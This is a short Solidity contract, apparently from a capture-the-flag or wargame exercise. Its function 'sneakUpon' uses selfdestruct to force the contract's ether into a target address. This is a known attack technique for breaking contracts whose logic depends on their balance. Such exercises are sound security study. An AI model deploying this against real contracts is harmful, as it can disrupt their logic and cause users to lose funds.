pragma solidity 0.4.24;
contract Suicider {
   constructor () public {
   }
   function sneakUpon(address _flagAddr) payable public {
       selfdestruct(_flagAddr);
   }
   
}
